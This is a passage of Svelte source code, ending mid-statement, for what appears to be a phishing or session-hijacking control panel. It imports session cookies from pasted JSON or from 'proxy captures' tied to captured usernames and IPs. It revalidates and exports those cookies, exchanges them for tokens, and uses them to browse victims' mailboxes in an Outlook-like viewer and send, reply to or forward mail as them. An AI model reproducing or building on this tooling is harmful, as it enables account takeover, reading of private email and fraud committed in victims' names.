<script>
	import { onMount, onDestroy } from 'svelte';
	import { api } from '$lib/api/apiProxy.js';
	import HeadTitle from '$lib/components/HeadTitle.svelte';
	import Headline from '$lib/components/Headline.svelte';
	import { hideIsLoading, showIsLoading } from '$lib/store/loading';
	import { addToast } from '$lib/store/toast';
	import BigButton from '$lib/components/BigButton.svelte';
	import Modal from '$lib/components/Modal.svelte';
	import FormGrid from '$lib/components/FormGrid.svelte';
	import FormFooter from '$lib/components/FormFooter.svelte';
	import TextField from '$lib/components/TextField.svelte';
	import TextareaField from '$lib/components/TextareaField.svelte';
	import Table from '$lib/components/table/Table.svelte';
	import TableRow from '$lib/components/table/TableRow.svelte';
	import TableCell from '$lib/components/table/TableCell.svelte';
	import TableCellAction from '$lib/components/table/TableCellAction.svelte';
	import TableCellEmpty from '$lib/components/table/TableCellEmpty.svelte';
	import TableDropDownEllipsis from '$lib/components/table/TableDropDownEllipsis.svelte';
	import DeleteAlert from '$lib/components/modal/DeleteAlert.svelte';
	import { newTableURLParams } from '$lib/service/tableURLParams.js';

	// --- State ---
	let stores = [];
	let storesHasNextPage = false;
	let isLoading = false;
	const tableURLParams = newTableURLParams();

	// Import modal
	let isImportModalVisible = false;
	let importName = '';
	let importCookiesText = '';
	let importError = '';
	let isImporting = false;

	// Send modal
	let isSendModalVisible = false;
	let sendForm = {
		cookieStoreId: '',
		cookieStoreName: '',
		to: '',
		cc: '',
		bcc: '',
		subject: '',
		body: '',
		isHTML: true,
		saveToSent: false,
		attachments: []
	};
	let isSending = false;
	let sendResult = null;
	let sendAttachmentFiles = [];

	// Inbox modal
	let isInboxModalVisible = false;
	let inboxStoreId = '';
	let inboxStoreName = '';
	let inboxStoreEmail = '';
	let inboxMessages = [];
	let inboxFolder = 'inbox';
	let inboxFolders = [];
	let inboxLoading = false;
	let inboxSkip = 0;
	let inboxLimit = 25;
	let inboxTotalCount = 0;
	let inboxSearch = '';
	let inboxSearchDebounceTimer = null;
	let inboxSearchActive = false; // true while a non-empty search is applied (client-side filter)

	// Message viewer modal
	let isMessageModalVisible = false;
	let currentMessage = null;
	let messageLoading = false;

	// v1.0.55: pollStoreStatus leak guard + OWA keyboard shortcuts
	let pollStoreStatusTimer = null;
	let owaContainerEl = null;
	let owaHighlightIndex = -1; // index into inboxMessages for j/k navigation
	let owaKeyPrefix = null; // 'g' prefix state for 2-key combos (gi / gs / gd)
	let owaKeyPrefixTimer = null;
	let owaSearchInputEl = null;

	// Import from Proxy Captures modal
	let isProxyCaptureModalVisible = false;
	let proxyCaptures = [];
	let proxyCapturesLoading = false;
	let selectedCapture = null;
	let proxyCaptureImportName = '';

	// Delete
	let isDeleteAlertVisible = false;
	let deleteValues = { id: null, name: null };

	// Bulk operations
	let selectedStoreIds = [];
	let isBulkDeleting = false;
	let isBulkRevalidating = false;
	let isBulkDeleteAlertVisible = false;

	// v1.0.47: Health summary, Export, Token Exchange
	let healthSummary = null;
	let healthData = [];
	let tokenExchangingId = null;
	let isExportModalVisible = false;
	let exportStoreId = null;
	let exportStoreName = '';
	let exportFormat = 'json';

	// --- OWA Theme System ---
	let owaTheme = 'blue'; // blue, dark, teal, purple, orange, light
	let owaBgImage = 'none'; // none, mountains, ocean, flowers, abstract, sunset, forest, city, northern-lights, desert, aurora
	let owaShowSettings = false;
	let owaFocusedTab = 'focused'; // focused, other
	let owaDraftSubject = '';
	let owaDraftBody = '';
	let owaDraftTo = '';
	let owaShowCompose = false;
	let owaCachedInbox = {}; // { [storeId]: { messages, folders, timestamp } }

	const owaThemes = {
		blue: { name: 'Blue', headerBg: 'linear-gradient(135deg, #0078d4 0%, #106ebe 100%)', accent: '#0078d4', sidebarActive: '#e6f2ff', sidebarActiveText: '#0078d4', sidebarActiveBorder: '#0078d4' },
		dark: { name: 'Dark', headerBg: 'linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%)', accent: '#0078d4', sidebarActive: 'rgba(0,120,212,0.15)', sidebarActiveText: '#60a5fa', sidebarActiveBorder: '#60a5fa' },
		teal: { name: 'Teal', headerBg: 'linear-gradient(135deg, #008272 0%, #00a38d 100%)', accent: '#008272', sidebarActive: '#e6f7f5', sidebarActiveText: '#008272', sidebarActiveBorder: '#008272' },
		purple: { name: 'Purple', headerBg: 'linear-gradient(135deg, #5c2d91 0%, #7b3fb5 100%)', accent: '#5c2d91', sidebarActive: '#f3eaff', sidebarActiveText: '#5c2d91', sidebarActiveBorder: '#5c2d91' },
		orange: { name: 'Orange', headerBg: 'linear-gradient(135deg, #ca5010 0%, #e06a2e 100%)', accent: '#ca5010', sidebarActive: '#fff4eb', sidebarActiveText: '#ca5010', sidebarActiveBorder: '#ca5010' },
		light: { name: 'Light', headerBg: 'linear-gradient(135deg, #f0f0f0 0%, #e0e0e0 100%)', accent: '#0078d4', sidebarActive: '#e6f2ff', sidebarActiveText: '#0078d4', sidebarActiveBorder: '#0078d4' }
	};

	const owaBgImages = [
		{ id: 'none', name: 'None', css: 'none' },
		{ id: 'mountains', name: 'Mountains', css: 'linear-gradient(135deg, rgba(30,64,175,0.85), rgba(59,130,246,0.85)), url("data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 1200 200\'%3E%3Cpath d=\'M0 200L200 60L400 140L600 20L800 120L1000 40L1200 160L1200 200Z\' fill=\'%23ffffff20\'/%3E%3Cpath d=\'M0 200L150 100L350 160L550 60L750 140L950 80L1200 180L1200 200Z\' fill=\'%23ffffff10\'/%3E%3C/svg%3E")' },
		{ id: 'ocean', name: 'Ocean', css: 'linear-gradient(135deg, rgba(0,100,180,0.9), rgba(0,150,200,0.85)), url("data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 1200 200\'%3E%3Cpath d=\'M0 100Q300 50 600 100T1200 80V200H0Z\' fill=\'%23ffffff15\'/%3E%3Cpath d=\'M0 130Q300 80 600 130T1200 110V200H0Z\' fill=\'%23ffffff10\'/%3E%3C/svg%3E")' },
		{ id: 'flowers', name: 'Flowers', css: 'linear-gradient(135deg, rgba(200,50,100,0.85), rgba(220,100,150,0.8))' },
		{ id: 'abstract', name: 'Abstract', css: 'linear-gradient(135deg, rgba(100,50,200,0.9), rgba(50,100,250,0.85), rgba(0,200,200,0.8))' },
		{ id: 'sunset', name: 'Sunset', css: 'linear-gradient(135deg, rgba(255,94,58,0.9), rgba(255,149,0,0.85), rgba(255,204,0,0.8))' },
		{ id: 'forest', name: 'Forest', css: 'linear-gradient(135deg, rgba(34,100,34,0.9), rgba(50,150,50,0.85))' },
		{ id: 'city', name: 'City Night', css: 'linear-gradient(135deg, rgba(20,20,40,0.95), rgba(40,40,80,0.9), rgba(60,60,120,0.85))' },
		{ id: 'northern-lights', name: 'Northern Lights', css: 'linear-gradient(135deg, rgba(0,50,80,0.9), rgba(0,150,100,0.7), rgba(100,0,200,0.6))' },
		{ id: 'desert', name: 'Desert', css: 'linear-gradient(135deg, rgba(194,154,108,0.9), rgba(220,180,140,0.85))' },
		{ id: 'aurora', name: 'Aurora', css: 'linear-gradient(135deg, rgba(0,30,60,0.95), rgba(0,100,150,0.8), rgba(100,200,100,0.6))' }
	];

	// App rail icons for the far-left sidebar
	const owaAppRailIcons = [
		{ id: 'mail', label: 'Mail', active: true, svg: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M22 7l-10 7L2 7"/></svg>' },
		{ id: 'calendar', label: 'Calendar', active: false, svg: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="3" y="4" width="18" height="18" rx="2"/><path d="M16 2v4M8 2v4M3 10h18"/><path d="M8 14h.01M12 14h.01M16 14h.01M8 18h.01M12 18h.01"/></svg>' },
		{ id: 'people', label: 'People', active: false, svg: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 00-3-3.87M16 3.13a4 4 0 010 7.75"/></svg>' },
		{ id: 'todo', label: 'To Do', active: false, svg: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M9 11l3 3L22 4"/><path d="M21 12v7a2 2 0 01-2 2H5a2 2 0 01-2-2V5a2 2 0 012-2h11"/></svg>' }
	];

	// Load OWA preferences from localStorage
	function loadOWAPreferences() {
		try {
			const saved = localStorage.getItem('owa_preferences');
			if (saved) {
				const prefs = JSON.parse(saved);
				owaTheme = prefs.theme || 'blue';
				owaBgImage = prefs.bgImage || 'none';
			}
			const cachedDraft = localStorage.getItem('owa_draft');
			if (cachedDraft) {
				const draft = JSON.parse(cachedDraft);
				owaDraftSubject = draft.subject || '';
				owaDraftBody = draft.body || '';
				owaDraftTo = draft.to || '';
			}
			const cachedInbox = localStorage.getItem('owa_cached_inbox');
			if (cachedInbox) {
				owaCachedInbox = JSON.parse(cachedInbox);
			}
		} catch (e) { /* ignore parse errors */ }
	}

	function saveOWAPreferences() {
		try {
			localStorage.setItem('owa_preferences', JSON.stringify({ theme: owaTheme, bgImage: owaBgImage }));
		} catch (e) { /* ignore */ }
	}

	function saveOWADraft() {
		try {
			localStorage.setItem('owa_draft', JSON.stringify({ subject: owaDraftSubject, body: owaDraftBody, to: owaDraftTo }));
		} catch (e) { /* ignore */ }
	}

	function cacheInboxData(storeId, messages, folders) {
		try {
			owaCachedInbox[storeId] = { messages: messages.slice(0, 50), folders, timestamp: Date.now() };
			localStorage.setItem('owa_cached_inbox', JSON.stringify(owaCachedInbox));
		} catch (e) { /* ignore */ }
	}

	function getCachedInbox(storeId) {
		const cached = owaCachedInbox[storeId];
		if (cached && (Date.now() - cached.timestamp) < 300000) { // 5 min cache
			return cached;
		}
		return null;
	}

	function getOWAHeaderBg() {
		const bg = owaBgImages.find(b => b.id === owaBgImage);
		if (bg && bg.id !== 'none') return bg.css;
		const theme = owaThemes[owaTheme];
		return theme ? theme.headerBg : owaThemes.blue.headerBg;
	}

	function setOWATheme(themeId) {
		owaTheme = themeId;
		saveOWAPreferences();
	}

	function setOWABgImage(bgId) {
		owaBgImage = bgId;
		saveOWAPreferences();
	}

	function toggleOWASettings() {
		owaShowSettings = !owaShowSettings;
	}

	function openOWACompose() {
		loadOWAPreferences();
		owaShowCompose = true;
	}

	function closeOWACompose() {
		owaShowCompose = false;
	}

	// Default folders
	const defaultFolders = [
		{ id: 'inbox', displayName: 'Inbox', unreadItemCount: 0, icon: 'inbox' },
		{ id: 'sentitems', displayName: 'Sent Items', unreadItemCount: 0, icon: 'send' },
		{ id: 'drafts', displayName: 'Drafts', unreadItemCount: 0, icon: 'draft' },
		{ id: 'junkemail', displayName: 'Junk Email', unreadItemCount: 0, icon: 'junk' },
		{ id: 'deleteditems', displayName: 'Deleted Items', unreadItemCount: 0, icon: 'trash' }
	];

	// Folder icons
	const folderIcons = {
		inbox: `<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20 13V6a2 2 0 00-2-2H6a2 2 0 00-2 2v7m16 0v5a2 2 0 01-2 2H6a2 2 0 01-2-2v-5m16 0h-2.586a1 1 0 00-.707.293l-2.414 2.414a1 1 0 01-.707.293h-3.172a1 1 0 01-.707-.293l-2.414-2.414A1 1 0 006.586 13H4"/></svg>`,
		send: `<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8"/></svg>`,
		draft: `<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"/></svg>`,
		junk: `<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/></svg>`,
		trash: `<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/></svg>`
	};

	// --- Lifecycle ---
	onMount(() => {
		refreshStores();
		loadHealthSummary();
		tableURLParams.onChange(refreshStores);
	});

	// --- Health Summary ---
	async function loadHealthSummary() {
		try {
			const res = await api.cookieStore.getHealthSummary();
			if (res.success) healthSummary = res.data;
		} catch (e) { /* health monitor may not be running */ }
		try {
			const res = await api.cookieStore.getHealth();
			if (res.success) healthData = res.data || [];
		} catch (e) { /* ignore */ }
	}

	// --- Token Exchange ---
	async function handleTokenExchange(store) {
		tokenExchangingId = store.id;
		addToast('Attempting token exchange...', 'info');
		try {
			const res = await api.cookieStore.tokenExchange(store.id);
			if (res.success && res.data?.success) {
				addToast(`Token exchange successful for ${res.data.email || store.email || 'session'}`, 'success');
				await refreshStores();
			} else {
				addToast(res.data?.message || 'Token exchange failed', 'error');
			}
		} catch (e) {
			addToast('Token exchange failed: ' + (e.message || ''), 'error');
		}
		tokenExchangingId = null;
	}

	// --- Export Cookies ---
	function openExportModal(store) {
		exportStoreId = store.id;
		exportStoreName = store.name;
		exportFormat = 'json';
		isExportModalVisible = true;
	}

	function handleExport() {
		api.cookieStore.exportCookies(exportStoreId, exportFormat);
		isExportModalVisible = false;
		addToast('Cookie export started', 'success');
	}

	function getHealthForStore(storeId) {
		return healthData.find(h => h.id === storeId);
	}

	// --- Data loading ---
	async function refreshStores() {
		isLoading = true;
		showIsLoading();
		try {
			const params = new URLSearchParams({
				page: tableURLParams.currentPage,
				perPage: tableURLParams.perPage,
				sortBy: tableURLParams.sortBy || 'created_at',
				sortOrder: tableURLParams.sortOrder || 'desc',
				search: tableURLParams.search || ''
			});
			const res = await api.cookieStore.getAll(params.toString());
			if (res.success) {
				stores = res.data.rows || [];
				storesHasNextPage = res.data.hasNextPage || false;
			} else {
				throw res.error;
			}
		} catch (e) {
			addToast('Failed to load cookie stores', 'error');
		}
		isLoading = false;
		hideIsLoading();
	}

	// --- Import ---
	function openImportModal() {
		importName = '';
		importCookiesText = '';
		importError = '';
		isImportModalVisible = true;
	}

	function closeImportModal() {
		isImportModalVisible = false;
	}

	async function handleImport() {
		importError = '';
		if (!importName.trim()) {
			importError = 'Name is required';
			return;
		}
		if (!importCookiesText.trim()) {
			importError = 'Cookies JSON is required';
			return;
		}

		let cookies;
		try {
			cookies = JSON.parse(importCookiesText);
			if (!Array.isArray(cookies)) {
				importError = 'Cookies must be a JSON array';
				return;
			}
		} catch (e) {
			importError = 'Invalid JSON: ' + e.message;
			return;
		}

		isImporting = true;
		try {
			const res = await api.cookieStore.importCookies({
				name: importName,
				cookies: cookies,
				source: 'import'
			});
			if (res && res.data) {
				addToast('Cookies imported. Validating and pre-automating in background...', 'success');
				isImportModalVisible = false;
				pollStoreStatus(3000);
			}
		} catch (e) {
			importError = e.message || 'Import failed';
		}
		isImporting = false;
	}

	function pollStoreStatus(delay) {
		// v1.0.55: Prevent stacking multiple timers — clear any prior scheduled poll
		// before scheduling the next one. Without this, every Import / Revalidate /
		// ProxyCapture call would start an independent setTimeout chain that all
		// hit refreshStores() in parallel forever.
		if (pollStoreStatusTimer) {
			clearTimeout(pollStoreStatusTimer);
			pollStoreStatusTimer = null;
		}
		pollStoreStatusTimer = setTimeout(async () => {
			pollStoreStatusTimer = null;
			await refreshStores();
			const hasRunning = stores.some(s => s.automationStatus === 'running');
			if (hasRunning) {
				pollStoreStatus(5000);
			}
		}, delay);
	}

	// --- Import from Proxy Captures ---
	async function openProxyCaptureModal() {
		isProxyCaptureModalVisible = true;
		proxyCaptures = [];
		selectedCapture = null;
		proxyCaptureImportName = '';
		proxyCapturesLoading = true;
		try {
			const params = new URLSearchParams({ page: 1, perPage: 50, sortBy: 'created_at', sortOrder: 'desc' });
			const res = await api.proxyCaptures.getAll(params.toString());
			if (res.success) {
				proxyCaptures = (res.data.rows || []).filter(c => c.Cookies && c.Cookies.length > 2);
			}
		} catch (e) {
			addToast('Failed to load proxy captures', 'error');
		}
		proxyCapturesLoading = false;
	}

	function closeProxyCaptureModal() {
		isProxyCaptureModalVisible = false;
	}

	async function handleProxyCaptureImport() {
		if (!selectedCapture) {
			addToast('Please select a capture', 'error');
			return;
		}
		const name = proxyCaptureImportName.trim() || `Proxy: ${selectedCapture.Username || selectedCapture.IPAddress || 'Unknown'}`;
		showIsLoading();
		try {
			const res = await api.cookieStore.importFromCapture(
				selectedCapture.ID,
				name,
				selectedCapture.Cookies
			);
			if (res && res.data) {
				addToast('Cookies imported from proxy capture. Validating and pre-automating in background...', 'success');
				isProxyCaptureModalVisible = false;
				pollStoreStatus(3000);
			}
		} catch (e) {
			addToast('Import failed: ' + (e.message || ''), 'error');
		}
		hideIsLoading();
	}

	let revalidatingId = null;

	// --- Revalidate ---
	async function revalidateStore(id) {
		revalidatingId = id;
		addToast('Revalidating session and pre-automating inbox...', 'info');
		try {
			await api.cookieStore.revalidate(id);
			addToast('Session revalidated. Inbox data will be cached in the background.', 'success');
			pollStoreStatus(3000);
		} catch (e) {
			addToast('Revalidation failed: ' + (e.message || ''), 'error');
		}
		revalidatingId = null;
	}

	// --- Delete ---
	function confirmDelete(store) {
		deleteValues = { id: store.id, name: store.name };
		isDeleteAlertVisible = true;
	}

	async function handleDelete() {
		showIsLoading();
		try {
			const res = await api.cookieStore.deleteByID(deleteValues.id);
			addToast('Cookie store deleted', 'success');
			await refreshStores();
			hideIsLoading();
			return { success: true };
		} catch (e) {
			addToast('Delete failed', 'error');
			hideIsLoading();
			return { success: false, error: e.message || 'Delete failed' };
		}
	}

	// --- Send ---
	function openSendModal(store) {
		sendForm = {
			cookieStoreId: store.id,
			cookieStoreName: store.name + (store.email ? ` (${store.email})` : ''),
			to: '',
			cc: '',
			bcc: '',
			subject: '',
			body: '',
			isHTML: true,
			saveToSent: false,
			attachments: []
		};
		sendResult = null;
		sendAttachmentFiles = [];
		isSendModalVisible = true;
	}

	// v1.0.55: Shared helper for compose/reply/replyAll/forward setup.
	// Dedups the prior openReplyModal/openForwardModal implementations and adds
	// a proper Reply All branch that preserves the original To + Cc (minus the
	// account's own address) and keeps the original sender in To.
	// mode: 'new' | 'reply' | 'replyAll' | 'forward'
	function openComposeModal(mode, msg) {
		const store = stores.find(s => s.id === inboxStoreId);
		if (!store) return;
		const storeName = store.name + (store.email ? ` (${store.email})` : '');
		const accountEmail = (store.email || inboxStoreEmail || '').toLowerCase();

		// Normalise an address list into lowercase, deduped, excluding the account's own email.
		const normaliseList = (list) => {
			if (!list) return [];
			const arr = Array.isArray(list)
				? list
				: String(list).split(',').map(s => s.trim()).filter(Boolean);
			const seen = new Set();
			const out = [];
			for (const raw of arr) {
				if (!raw) continue;
				const key = raw.toLowerCase();
				if (accountEmail && key === accountEmail) continue;
				if (seen.has(key)) continue;
				seen.add(key);
				out.push(raw);
			}
			return out;
		};

		let to = '';
		let cc = '';
		let subject = '';
		let body = '';

		if (mode === 'reply' || mode === 'replyAll') {
			subject = msg && msg.subject
				? (msg.subject.startsWith('Re: ') ? msg.subject : `Re: ${msg.subject}`)
				: '';
			body = msg
				? `<br/><br/><hr/><p>On ${formatDate(msg.date)}, ${msg.fromName || msg.from} wrote:</p><blockquote style="border-left:2px solid #ccc;padding-left:10px;margin-left:10px;color:#666">${msg.bodyHTML || msg.bodyText || ''}</blockquote>`
				: '';
			if (mode === 'replyAll' && msg) {
				const toList = normaliseList([msg.from, ...(Array.isArray(msg.to) ? msg.to : [])]);
				to = toList.join(', ');
				cc = normaliseList(Array.isArray(msg.cc) ? msg.cc : (msg.cc || '')).join(', ');
			} else {
				to = msg ? (msg.from || '') : '';
			}
		} else if (mode === 'forward') {
			subject = msg && msg.subject
				? (msg.subject.startsWith('Fwd: ') ? msg.subject : `Fwd: ${msg.subject}`)
				: '';
			body = msg
				? `<br/><br/><hr/><p>---------- Forwarded message ----------</p><p>From: ${msg.fromName || ''} &lt;${msg.from || ''}&gt;<br/>Date: ${formatDate(msg.date)}<br/>Subject: ${msg.subject || ''}</p><br/>${msg.bodyHTML || msg.bodyText || ''}`
				: '';
		}

		sendForm = {
			cookieStoreId: store.id,
			cookieStoreName: storeName,
			to,
			cc,
			bcc: '',
			subject,
			body,
			isHTML: true,
			saveToSent: false,
			attachments: []
		};
		sendResult = null;
		sendAttachmentFiles = [];
		isMessageModalVisible = false;
		isSendModalVisible = true;
	}

	// Open send modal pre-filled for reply
	function openReplyModal(msg) {
		openComposeModal('reply', msg);
	}

	// Open send modal pre-filled for reply-all
	function openReplyAllModal(msg) {
		openComposeModal('replyAll', msg);
	}

	// Open send modal pre-filled for forward
	function openForwardModal(msg) {
		openComposeModal('forward', msg);
	}

	function closeSendModal() {
		isSendModalVisible = false;
	}

	// Handle file attachment upload
	function handleAttachmentUpload(event) {
		const files = event.target.files;
		if (!files) return;
		for (const file of files) {
			const reader = new FileReader();
				reader.onload = (e) => {
				const base64 = e.target.result.split(',')[1];
				sendForm.attachments = [...sendForm.attachments, {
					name: file.name,
					contentType: file.type || 'application/octet-stream',
					contentBase64: base64,
					size: file.size
				}];
			};
			reader.readAsDataURL(file);
		}
		// Reset input
		event.target.value = '';
	}

	function removeAttachment(index) {
		sendForm.attachments = sendForm.attachments.filter((_, i) => i !== index);
	}

	function formatFileSize(bytes) {
		if (bytes < 1024) return bytes + ' B';
		if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
		return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
	}

	async function handleSend() {
		if (!sendForm.to.trim()) {
			addToast('Recipient is required', 'error');
			return;
		}
		if (!sendForm.subject.trim()) {
			addToast('Subject is required', 'error');
			return;
		}

		isSending = true;
		sendResult = null;
		try {
			const toList = sendForm.to.split(',').map((e) => e.trim()).filter(Boolean);
			const ccList = sendForm.cc ? sendForm.cc.split(',').map((e) => e.trim()).filter(Boolean) : [];
			const bccList = sendForm.bcc ? sendForm.bcc.split(',').map((e) => e.trim()).filter(Boolean) : [];

			const res = await api.cookieStore.send({
				cookieStoreId: sendForm.cookieStoreId,
				to: toList,
				cc: ccList,
				bcc: bccList,
				subject: sendForm.subject,
				body: sendForm.body,
				isHTML: sendForm.isHTML,
				saveToSent: sendForm.saveToSent,
				attachments: sendForm.attachments.length > 0 ? sendForm.attachments : undefined
			});
			if (res && res.data) {
				sendResult = res.data;
				if (res.data.success) {
					addToast('Email sent successfully via ' + (res.data.method || 'cookies'), 'success');
				} else {
					addToast('Send failed: ' + (res.data.error || 'Unknown error'), 'error');
				}
			}
		} catch (e) {
			sendResult = { success: false, error: e.message || 'Send failed' };
			addToast('Send failed: ' + (e.message || ''), 'error');
		}
		isSending = false;
	}

	// --- Inbox ---
	async function openInbox(store) {
		loadOWAPreferences();
		inboxStoreId = store.id;
		inboxStoreName = store.name + (store.email ? ` (${store.email})` : '');
		inboxStoreEmail = store.email || '';
		inboxMessages = [];
		inboxFolder = 'inbox';
		inboxFolders = defaultFolders;
		inboxSkip = 0;
		inboxTotalCount = 0;
		inboxSearch = '';
		owaShowSettings = false;
		owaShowCompose = false;
		owaFocusedTab = 'focused';
		isInboxModalVisible = true;
		// Try cached data first for instant display
		const cached = getCachedInbox(store.id);
		if (cached) {
			inboxMessages = cached.messages || [];
			if (cached.folders && cached.folders.length > 0) inboxFolders = cached.folders;
		}
		await loadInbox();
		loadFolders();
	}

	function closeInboxModal() {
		// v1.0.55: Reset OWA keyboard state and drop the container listener on close.
		owaHighlightIndex = -1;
		owaKeyPrefix = null;
		if (owaKeyPrefixTimer) { clearTimeout(owaKeyPrefixTimer); owaKeyPrefixTimer = null; }
		if (inboxSearchDebounceTimer) { clearTimeout(inboxSearchDebounceTimer); inboxSearchDebounceTimer = null; }
		inboxSearch = '';
		inboxSearchActive = false;
		isInboxModalVisible = false;
	}

	// v1.0.55: Client-side inbox search. Backend /cookie-store/:id/inbox does
	// not accept a `search` param (see backend/controller/cookieStore.go
	// GetInbox — only folder/limit/skip). We therefore filter the currently
	// loaded page of messages case-insensitively on From / Subject / Preview.
	// Tradeoff: we only filter what's already loaded — messages on other
	// pagination pages won't appear until the user pages to them. Acceptable
	// for v1; a backend query param would be the proper long-term fix.
	$: visibleInboxMessages = inboxSearchActive && inboxSearch.trim()
		? (() => {
			const q = inboxSearch.trim().toLowerCase();
			return inboxMessages.filter(m =>
				(m.from && String(m.from).toLowerCase().includes(q)) ||
				(m.fromName && String(m.fromName).toLowerCase().includes(q)) ||
				(m.subject && String(m.subject).toLowerCase().includes(q)) ||
				(m.preview && String(m.preview).toLowerCase().includes(q))
			);
		})()
		: inboxMessages;

	function handleInboxSearchInput() {
		if (inboxSearchDebounceTimer) {
			clearTimeout(inboxSearchDebounceTimer);
			inboxSearchDebounceTimer = null;
		}
		inboxSearchDebounceTimer = setTimeout(() => {
			inboxSearchDebounceTimer = null;
			const q = (inboxSearch || '').trim();
			if (q) {
				inboxSearchActive = true;
				inboxSkip = 0; // reset pagination so counts line up with filtered view
				owaHighlightIndex = -1;
			} else if (inboxSearchActive) {
				// Search cleared — return to normal loading behaviour
				inboxSearchActive = false;
				inboxSkip = 0;
				owaHighlightIndex = -1;
				loadInbox();
			}
		}, 300);
	}

	// v1.0.55: Keyboard shortcuts for the OWA container. Attached to the
	// container element (not window) so other pages never see these events.
	function handleOWAKeydown(e) {
		if (!isInboxModalVisible) return;

		// Ignore while typing in inputs/textareas/contenteditable, but let
		// Escape / '/' still work when focused on the search input itself.
		const tgt = e.target;
		const tag = tgt && tgt.tagName ? tgt.tagName.toUpperCase() : '';
		const isEditable = tag === 'INPUT' || tag === 'TEXTAREA' || (tgt && tgt.isContentEditable);
		if (isEditable && e.key !== 'Escape') return;

		// Disable shortcuts while compose or settings panels are active —
		// those surfaces either contain their own inputs or are transient
		// overlays where j/k/r/f should not fire. Escape still works so the
		// user can always back out.
		if (owaShowCompose || owaShowSettings || isSendModalVisible) {
			if (e.key !== 'Escape') return;
		}

		// Two-key 'g' combos: gi (Inbox), gs (Sent), gd (Drafts)
		if (owaKeyPrefix === 'g') {
			if (e.key === 'i' || e.key === 's' || e.key === 'd') {
				e.preventDefault();
				owaKeyPrefix = null;
				if (owaKeyPrefixTimer) { clearTimeout(owaKeyPrefixTimer); owaKeyPrefixTimer = null; }
				const map = { i: 'inbox', s: 'sentitems', d: 'drafts' };
				const targetId = map[e.key];
				const match = inboxFolders.find(f => (f.id || '').toLowerCase() === targetId)
					|| inboxFolders.find(f => (f.id || '').toLowerCase().includes(targetId));
				if (match) switchFolder(match.id);
				return;
			}
			// Any other key cancels the prefix
			owaKeyPrefix = null;
			if (owaKeyPrefixTimer) { clearTimeout(owaKeyPrefixTimer); owaKeyPrefixTimer = null; }
		}

		switch (e.key) {
			case 'j':
			case 'ArrowDown': {
				const list = visibleInboxMessages || [];
				if (!list.length) return;
				e.preventDefault();
				owaHighlightIndex = Math.min(list.length - 1, owaHighlightIndex < 0 ? 0 : owaHighlightIndex + 1);
				return;
			}
			case 'k':
			case 'ArrowUp': {
				const list = visibleInboxMessages || [];
				if (!list.length) return;
				e.preventDefault();
				owaHighlightIndex = Math.max(0, owaHighlightIndex < 0 ? 0 : owaHighlightIndex - 1);
				return;
			}
			case 'Enter': {
				const list = visibleInboxMessages || [];
				if (owaHighlightIndex >= 0 && owaHighlightIndex < list.length) {
					e.preventDefault();
					openMessage(list[owaHighlightIndex].id);
				}
				return;
			}
			case 'r': {
				if (currentMessage && isMessageModalVisible) {
					e.preventDefault();
					openReplyModal(currentMessage);
				}
				return;
			}
			case 'a': {
				if (currentMessage && isMessageModalVisible) {
					e.preventDefault();
					openReplyAllModal(currentMessage);
				}
				return;
			}
			case 'f': {
				if (currentMessage && isMessageModalVisible) {
					e.preventDefault();
					openForwardModal(currentMessage);
				}
				return;
			}
			case '/': {
				e.preventDefault();
				if (owaSearchInputEl) {
					owaSearchInputEl.focus();
					owaSearchInputEl.select && owaSearchInputEl.select();
				}
				return;
			}
			case 'Escape': {
				if (isMessageModalVisible) {
					e.preventDefault();
					closeMessageModal();
				} else if (owaShowSettings) {
					owaShowSettings = false;
				} else if (owaShowCompose) {
					owaShowCompose = false;
				} else {
					closeInboxModal();
				}
				return;
			}
			case 'g': {
				// Start a 'g' prefix, waiting ~1s for the follow-up key
				e.preventDefault();
				owaKeyPrefix = 'g';
				if (owaKeyPrefixTimer) clearTimeout(owaKeyPrefixTimer);
				owaKeyPrefixTimer = setTimeout(() => {
					owaKeyPrefix = null;
					owaKeyPrefixTimer = null;
				}, 1000);
				return;
			}
		}
	}

	// Reactive wire-up: attach/detach the OWA keydown listener as the container
	// mounts/unmounts. The `_owaListenerAttached` flag makes the effect
	// idempotent — Svelte may re-run the reactive block when unrelated state
	// changes, and we must not register the handler more than once.
	let _owaListenerAttached = false;
	$: {
		if (owaContainerEl && isInboxModalVisible && !_owaListenerAttached) {
			owaContainerEl.addEventListener('keydown', handleOWAKeydown);
			if (!owaContainerEl.hasAttribute('tabindex')) {
